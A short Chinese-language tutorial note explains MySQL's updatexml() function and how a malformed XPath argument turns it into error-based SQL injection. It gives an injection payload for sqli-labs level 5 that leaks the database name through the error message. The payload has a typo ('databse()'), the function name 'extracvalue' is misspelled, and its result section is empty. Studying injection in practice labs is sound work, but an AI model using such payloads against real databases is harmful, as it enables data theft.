#### updatexml()函数
- 在mysql高版本中(大于5.1版本)中添加了对XML文档进行查询和修改的函数，updatexml(),extracvalue()而显示错误则需要在开发程序中采用print_r mysql_error()函数，将mysql错误信息输出。

- 作用：改变文档中符合条件的节点,使用不同的xml标记匹配和替换xml块的函数。
```shell
updatexml(XML_document,XPath_string,new_value);
#XML_document:String格式，为XML文档对象的名称，文中为Doc
#XPath_string:Xpath格式的字符串，代表路径。
#new_value:String格式，替换查找到的符合条件的数据。
```

#### 注入报错原理
- 在使用此语句时，如果XPath_string不符合该种类格式，就会出现格式错误，并且会以系统报错的形式提示出错误，也就是我们的输入的具体的字符串不合规范。
- 那么哪些格式是不符合规范的，比如在字母数字前加入特殊字符如~，*

#### 实例sqli-labs第五关
```shell
id = 1' and updatexml(1,concat('~',(select databse()),'~'),1) --+

#结果:
如果还想要其他查询语句，在select那个位置做修改即可
```